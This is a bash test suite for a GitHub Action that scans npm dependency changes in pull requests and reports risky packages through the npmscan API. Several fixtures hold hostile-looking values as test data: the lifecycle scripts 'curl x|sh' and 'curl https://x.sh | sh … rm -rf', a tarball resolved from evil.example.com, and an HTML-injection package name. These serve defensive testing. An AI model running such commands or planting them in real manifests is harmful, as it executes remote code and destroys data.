#!/usr/bin/env bash
# shellcheck disable=SC2016 # expected markdown contains literal backticks
# Runs scripts/scan.sh against throwaway git repos, with gh and curl stubbed
# (tests/stubs) and real npmscan API responses as fixtures (tests/fixtures).
#   tests/run.sh            run all tests
#   LIVE=1 tests/run.sh     also run one test against the real npmscan.com API
set -uo pipefail

ROOT=$(cd "$(dirname "$0")/.." && pwd)
FIX="$ROOT/tests/fixtures"
PASSED=0
FAILED=0
CURRENT=""

fail() { echo "  ✗ $CURRENT: $1"; FAILED=$((FAILED + 1)); }
ok() { PASSED=$((PASSED + 1)); }
assert_eq() { if [ "$1" = "$2" ]; then ok; else fail "expected '$2', got '$1'${3:+ ($3)}"; fi; }
assert_contains() { if printf '%s' "$1" | grep -qF -- "$2"; then ok; else fail "missing '$2'${3:+ in $3}"; fi; }
assert_not_contains() { if printf '%s' "$1" | grep -qF -- "$2"; then fail "unexpected '$2'${3:+ in $3}"; else ok; fi; }

# Fresh repo whose base commit holds the given files: new_repo path content [path content...]
new_repo() {
  T=$(mktemp -d)
  REPO="$T/repo" LOG="$T/log"
  mkdir -p "$REPO" "$LOG"
  git -C "$REPO" init -q
  git -C "$REPO" config user.email t@example.com
  git -C "$REPO" config user.name test
  write_files "$@"
  git -C "$REPO" add -A
  git -C "$REPO" commit -q --allow-empty -m base
  BASE=$(git -C "$REPO" rev-parse HEAD)
}

write_files() {
  while [ $# -gt 0 ]; do
    mkdir -p "$(dirname "$REPO/$1")"
    printf '%s\n' "$2" > "$REPO/$1"
    shift 2
  done
}

# Commit the PR head: head path content [path content...]
head_commit() {
  write_files "$@"
  git -C "$REPO" add -A
  git -C "$REPO" commit -q --allow-empty -m head
}

# run_scan [VAR=value...] — sets OUT, CODE, OUTPUT, SUMMARY, COMMENT, GHLOG
run_scan() {
  rm -f "$T/output" "$T/summary" "$LOG"/*
  OUT=$(cd "$REPO" && env PATH="$ROOT/tests/stubs:$PATH" \
    PR=7 BASE_SHA="$BASE" GITHUB_REPOSITORY=acme/app HEAD_REPO=acme/app \
    GITHUB_OUTPUT="$T/output" GITHUB_STEP_SUMMARY="$T/summary" RUNNER_TEMP="$T" STUB_LOG="$LOG" \
    INPUT_FILE=package.json "$@" bash "$ROOT/scripts/scan.sh" 2>&1)
  CODE=$?
  OUTPUT=$(cat "$T/output" 2>/dev/null)
  SUMMARY=$(cat "$T/summary" 2>/dev/null)
  COMMENT=$(jq -r .body "$LOG/comment.json" 2>/dev/null)
  GHLOG=$(cat "$LOG/gh.log" 2>/dev/null)
}

t() { CURRENT=$1; echo "• $1"; }

# ---------------------------------------------------------------------------

t "vulnerable package blocks by default"
new_repo package.json '{"dependencies":{"lodash":"4.17.21"}}'
head_commit package.json '{
  "dependencies": {
    "lodash": "4.17.15"
  }
}'
run_scan FAKE_RESPONSE="$FIX/vulnerable.json"
assert_eq "$CODE" 1 "exit code"
assert_contains "$OUTPUT" "flagged-count=1"
assert_contains "$OUTPUT" "blocking-count=1"
assert_contains "$OUTPUT" "error-count=0"
assert_contains "$COMMENT" "<!-- npmscan-action:package.json -->" "comment marker"
assert_contains "$COMMENT" "❌ **1 finding blocks this PR.**"
assert_contains "$COMMENT" '[`lodash`](https://npmscan.com/package/lodash)'
assert_contains "$COMMENT" "HIGH · 6 advisories"
assert_contains "$COMMENT" "<details><summary>Advisories</summary>"
assert_contains "$OUT" "::error file=package.json,line=3,title=npmscan%3A lodash::lodash 4.17.21 → 4.17.15: HIGH vulnerability"
assert_contains "$GHLOG" "-X POST repos/acme/app/issues/7/comments"
assert_eq "$SUMMARY" "$COMMENT" "job summary matches comment"

t "warn mode reports but passes"
new_repo package.json '{"dependencies":{"lodash":"4.17.21"}}'
head_commit package.json '{"dependencies":{"lodash":"4.17.15"}}'
run_scan FAKE_RESPONSE="$FIX/vulnerable.json" INPUT_MODE=warn
assert_eq "$CODE" 0 "exit code"
assert_contains "$OUTPUT" "blocking-count=1"
assert_contains "$COMMENT" "would block this PR"
assert_contains "$OUT" "::warning file=package.json"

t "fail-on-flagged: false still means warn"
run_scan FAKE_RESPONSE="$FIX/vulnerable.json" INPUT_FAIL_ON_FLAGGED=false
assert_eq "$CODE" 0 "exit code"
assert_contains "$COMMENT" '`mode: warn`'

t "fail-on-severity above the finding passes"
run_scan FAKE_RESPONSE="$FIX/vulnerable.json" INPUT_FAIL_ON_SEVERITY=critical
assert_eq "$CODE" 0 "exit code"
assert_contains "$OUTPUT" "flagged-count=1"
assert_contains "$OUTPUT" "blocking-count=0"
assert_contains "$COMMENT" "none at or above the configured thresholds"

t "fail-on-severity: high blocks a HIGH finding"
run_scan FAKE_RESPONSE="$FIX/vulnerable.json" INPUT_FAIL_ON_SEVERITY=HIGH
assert_eq "$CODE" 1 "exit code"

t "new package with install script and changed source are both shown"
new_repo package-lock.json '{"lockfileVersion":3,"packages":{"node_modules/ms":{"version":"2.1.3"}}}'
head_commit package-lock.json '{
  "lockfileVersion": 3,
  "packages": {
    "node_modules/ms": {"version": "2.1.3", "resolved": "https://evil.example.com/ms-2.1.3.tgz"},
    "node_modules/esbuild": {"version": "0.19.0", "hasInstallScript": true}
  }
}'
run_scan INPUT_FILE=package-lock.json FAKE_RESPONSE="$FIX/install-and-source.json"
assert_eq "$CODE" 1 "exit code"
assert_contains "$OUTPUT" "blocking-count=2"
assert_contains "$COMMENT" "⚠️ new package with install scripts"
assert_contains "$COMMENT" "MODERATE · 1 advisory"
assert_contains "$COMMENT" '⚠️ changed → `evil.example.com`'
assert_contains "$OUT" "file=package-lock.json,line=5,title=npmscan%3A esbuild"
assert_contains "$OUT" "file=package-lock.json,line=4,title=npmscan%3A ms"

t "install-script and source thresholds can be turned off"
run_scan INPUT_FILE=package-lock.json FAKE_RESPONSE="$FIX/install-and-source.json" \
  INPUT_FAIL_ON_INSTALL_SCRIPT=false INPUT_FAIL_ON_SOURCE_CHANGE=no INPUT_FAIL_ON_SEVERITY=high
assert_eq "$CODE" 0 "exit code"
assert_contains "$OUTPUT" "flagged-count=2"
assert_contains "$OUTPUT" "blocking-count=0"

t "annotations point at the package in yarn.lock and pnpm-lock.yaml"
new_repo README.md hi
head_commit yarn.lock '# yarn lockfile v1

"@scope/other@^1.0.0":
  version "1.0.0"

esbuild@^0.19.0:
  version "0.19.0"

ms@^2.1.3, ms@2.1.3:
  version "2.1.3"' pnpm-lock.yaml "lockfileVersion: '9.0'

importers:
  .:
    dependencies:
      ms:
        version: 2.1.3

packages:
  esbuild@0.19.0:
    resolution: {integrity: sha512-x}
  ms@2.1.3:
    resolution: {integrity: sha512-y}"
run_scan INPUT_FILE=yarn.lock FAKE_RESPONSE="$FIX/install-and-source.json"
assert_contains "$OUT" "file=yarn.lock,line=6,title=npmscan%3A esbuild"
assert_contains "$OUT" "file=yarn.lock,line=9,title=npmscan%3A ms"
run_scan INPUT_FILE=pnpm-lock.yaml FAKE_RESPONSE="$FIX/install-and-source.json"
assert_contains "$OUT" "file=pnpm-lock.yaml,line=10,title=npmscan%3A esbuild"
assert_contains "$OUT" "file=pnpm-lock.yaml,line=12,title=npmscan%3A ms"

t "root lifecycle scripts and overrides are rendered and counted"
new_repo package.json '{"dependencies":{"ms":"2.1.3"},"overrides":{"ms":"2.1.2","a":"1"},"scripts":{"postinstall":"node a.js","prepare":"husky"}}'
head_commit package.json '{
  "dependencies": {"ms": "2.1.3"},
  "overrides": {
    "ms": "npm:evil-ms@1.0.0"
  },
  "scripts": {
    "prepare": "curl x|sh"
  }
}'
run_scan FAKE_RESPONSE="$FIX/project-changes.json"
assert_eq "$CODE" 1 "exit code"
assert_contains "$OUTPUT" "flagged-count=3"
assert_contains "$COMMENT" "**Root lifecycle scripts changed**"
assert_contains "$COMMENT" '| ❌ | `prepare` | changed | `husky` → `curl x\|sh` |'
assert_contains "$COMMENT" '| ℹ️ | `postinstall` | removed | `node a.js` |'
assert_contains "$COMMENT" "**Overrides / resolutions changed**"
assert_contains "$COMMENT" '| ❌ | `foo` | added | `1.0.0` |'
assert_contains "$COMMENT" '| ❌ | `ms` | changed | `2.1.2` → `npm:evil-ms@1.0.0` |'
assert_not_contains "$OUT" "title=npmscan%3A postinstall" "removed scripts are not annotated"
assert_contains "$OUT" "file=package.json,line=7,title=npmscan%3A prepare"
assert_contains "$OUT" "file=package.json,line=4,title=npmscan%3A ms"

t "clean diff passes and says so"
new_repo package.json '{"dependencies":{"ms":"2.1.3"}}'
head_commit package.json '{"dependencies":{"ms":"2.1.2"}}'
run_scan FAKE_RESPONSE="$FIX/clean.json"
assert_eq "$CODE" 0 "exit code"
assert_contains "$OUTPUT" "flagged-count=0"
assert_contains "$COMMENT" "✅ No risky dependency changes found."

t "API outage warns but does not block by default"
run_scan FAKE_CODE=503 FAKE_RESPONSE="$FIX/clean.json"
assert_eq "$CODE" 0 "exit code"
assert_contains "$OUTPUT" "error-count=1"
assert_not_contains "$OUTPUT" "flagged-count"
assert_contains "$OUT" "::warning title=npmscan scan failed::package.json: npmscan API returned HTTP 503"
assert_contains "$COMMENT" "not blocking (\`fail-on-error: false\`)"

t "network failure with fail-on-error: true fails"
run_scan FAKE_CODE=000 INPUT_FAIL_ON_ERROR=true
assert_eq "$CODE" 1 "exit code"
assert_contains "$OUT" "::error title=npmscan scan failed::package.json: npmscan API returned HTTP 000: curl: (7)"

t "unexpected API response is an error, not a pass"
echo '<html>oops</html>' > "$T/bad.json"
run_scan FAKE_RESPONSE="$T/bad.json" INPUT_FAIL_ON_ERROR=true
assert_eq "$CODE" 1 "exit code"
assert_contains "$OUT" "unexpected response"

t "unreachable base commit is a scan error"
run_scan BASE_SHA=0000000000000000000000000000000000000000 FAKE_RESPONSE="$FIX/clean.json"
assert_eq "$CODE" 0 "exit code"
assert_contains "$OUT" "Could not fetch the base commit"

t "new yarn.lock is compared against an empty yarn lockfile"
new_repo README.md hi
head_commit yarn.lock '# yarn lockfile v1

ms@^2.1.3:
  version "2.1.3"'
run_scan INPUT_FILE=yarn.lock FAKE_RESPONSE="$FIX/clean.json"
assert_eq "$(jq -r .before "$LOG/request.json")" "# yarn lockfile v1"
assert_contains "$COMMENT" '### `yarn.lock` · new in this PR'

t "new pnpm and npm lockfiles get matching placeholders"
head_commit pnpm-lock.yaml "lockfileVersion: '9.0'

packages:
  ms@2.1.3:
    resolution: {integrity: sha512-x}" package-lock.json '{"lockfileVersion":3,"packages":{"node_modules/ms":{}}}'
run_scan INPUT_FILE=pnpm-lock.yaml FAKE_RESPONSE="$FIX/clean.json"
assert_eq "$(jq -r .before "$LOG/request.json")" "lockfileVersion: '9.0'"
run_scan INPUT_FILE=package-lock.json FAKE_RESPONSE="$FIX/clean.json"
assert_eq "$(jq -r .before "$LOG/request.json")" '{"lockfileVersion":3,"packages":{}}'

t "unchanged file makes no API call and no comment"
new_repo package.json '{"dependencies":{"ms":"2.1.3"}}'
head_commit
run_scan FAKE_RESPONSE="$FIX/clean.json"
assert_eq "$CODE" 0 "exit code"
assert_eq "$([ -f "$LOG/curl.calls" ] && wc -l < "$LOG/curl.calls" | tr -d ' ' || echo 0)" 0 "API calls"
assert_not_contains "$GHLOG" "-X POST"
assert_not_contains "$OUTPUT" "flagged-count"

t "unchanged file clears a stale npmscan comment"
run_scan FAKE_RESPONSE="$FIX/clean.json" \
  GH_COMMENTS='[{"id":41,"body":"<!-- npmscan-action:package.json -->\n## old findings"}]'
assert_contains "$GHLOG" "-X PATCH repos/acme/app/issues/comments/41"
assert_contains "$COMMENT" "No dependency file changes left to scan"

t "edits only its own comment, never another bot's"
new_repo package.json '{"dependencies":{"lodash":"4.17.21"}}'
head_commit package.json '{"dependencies":{"lodash":"4.17.15"}}'
run_scan FAKE_RESPONSE="$FIX/vulnerable.json" \
  GH_COMMENTS='[{"id":1,"body":"<!-- npmscan-action:package.json -->\nold"}][{"id":2,"body":"Coverage report from another bot"}]'
assert_contains "$GHLOG" "-X PATCH repos/acme/app/issues/comments/1"
assert_not_contains "$GHLOG" "comments/2"
assert_not_contains "$GHLOG" "-X POST"

t "a comment for a different file list is left alone"
run_scan FAKE_RESPONSE="$FIX/vulnerable.json" \
  GH_COMMENTS='[{"id":5,"body":"<!-- npmscan-action:packages/a/package.json -->\nother step"},{"id":6,"body":"> <!-- npmscan-action:package.json -->\nquoted by a human"}]'
assert_not_contains "$GHLOG" "PATCH"
assert_contains "$GHLOG" "-X POST repos/acme/app/issues/7/comments"

t "several files report in one comment"
new_repo packages/a/package.json '{"dependencies":{"lodash":"4.17.21"}}' packages/b/package.json '{"dependencies":{"ms":"2.1.3"}}' packages/c/package.json '{}'
head_commit packages/a/package.json '{"dependencies":{"lodash":"4.17.15"}}' packages/b/package.json '{"dependencies":{"ms":"2.1.2"}}'
run_scan FAKE_RESPONSE="$FIX/vulnerable.json" INPUT_FILES='packages/a/package.json
./packages/b/package.json, packages/c/package.json
packages/d/package.json'
assert_eq "$CODE" 1 "exit code"
assert_contains "$COMMENT" "<!-- npmscan-action:packages/a/package.json,packages/b/package.json,packages/c/package.json,packages/d/package.json -->"
assert_contains "$COMMENT" '### `packages/a/package.json`'
assert_contains "$COMMENT" '### `packages/b/package.json`'
assert_contains "$COMMENT" 'Not scanned: `packages/c/package.json` (unchanged), `packages/d/package.json` (not found)'
assert_contains "$OUTPUT" "flagged-count=2"
assert_eq "$(wc -l < "$LOG/curl.calls" | tr -d ' ')" 2 "API calls"

t "PR-controlled text cannot break the markdown"
new_repo package.json '{}'
head_commit package.json '{"dependencies":{"x":"1"}}'
run_scan FAKE_RESPONSE="$FIX/injection.json" INPUT_MODE=warn
assert_contains "$COMMENT" '| ⚠️ | `evil\|pkg x  @acme/team <img src=x>` | new → `1.0.0\| ` |'
assert_not_contains "$COMMENT" "javascript:"
assert_contains "$COMMENT" '`curl https://x.sh \| sh @everyone  rm -rf `'
assert_contains "$COMMENT" "> [!WARNING]
> Results are partial: Only the first 100 packages were enriched"
assert_contains "$OUT" "::warning file=package.json,title=npmscan%3A postinstall::Root postinstall script added: curl https://x.sh | sh @everyone  rm -rf "

t "Dependabot PR with a read-only token gets a specific hint"
new_repo package.json '{"dependencies":{"lodash":"4.17.21"}}'
head_commit package.json '{"dependencies":{"lodash":"4.17.15"}}'
run_scan FAKE_RESPONSE="$FIX/vulnerable.json" GH_FAIL_WRITE=1 PR_AUTHOR='dependabot[bot]'
assert_contains "$OUT" "Dependabot PRs get a read-only token unless the workflow sets 'permissions: pull-requests: write'"
assert_contains "$SUMMARY" "lodash" "job summary"
assert_eq "$CODE" 1 "findings still block"

t "fork PR with a read-only token gets a fork hint"
run_scan FAKE_RESPONSE="$FIX/clean.json" GH_FAIL_WRITE=1 HEAD_REPO=someone/app
assert_contains "$OUT" "PRs from forks get a read-only token"

t "invalid inputs fail fast"
run_scan INPUT_MODE=enforce
assert_eq "$CODE" 1 "bad mode"
assert_contains "$OUT" "Input 'mode' must be 'block' or 'warn'"
run_scan INPUT_FAIL_ON_SEVERITY=severe
assert_eq "$CODE" 1 "bad severity"
run_scan INPUT_FAIL_ON_ERROR=maybe
assert_eq "$CODE" 1 "bad boolean"
run_scan INPUT_FILE=../outside/package.json
assert_contains "$OUT" "must be relative to the repository root"
run_scan PR=
assert_contains "$OUT" "only runs on pull_request events"

if [ "${LIVE:-}" = 1 ]; then
  t "live: real npmscan.com API flags lodash@4.17.15"
  new_repo package.json '{"dependencies":{"lodash":"4.17.21"}}'
  head_commit package.json '{"dependencies":{"lodash":"4.17.15"}}'
  mkdir -p "$T/bin" && ln -s "$ROOT/tests/stubs/gh" "$T/bin/gh"
  OUT=$(cd "$REPO" && env PATH="$T/bin:$PATH" PR=7 BASE_SHA="$BASE" GITHUB_REPOSITORY=acme/app \
    GITHUB_OUTPUT="$T/output" GITHUB_STEP_SUMMARY="$T/summary" RUNNER_TEMP="$T" STUB_LOG="$LOG" \
    INPUT_FILE=package.json INPUT_MODE=warn bash "$ROOT/scripts/scan.sh" 2>&1)
  assert_contains "$(cat "$T/output")" "flagged-count=1"
  assert_contains "$(cat "$T/summary")" "lodash"
fi

echo
echo "$PASSED passed, $FAILED failed"
[ "$FAILED" -eq 0 ]
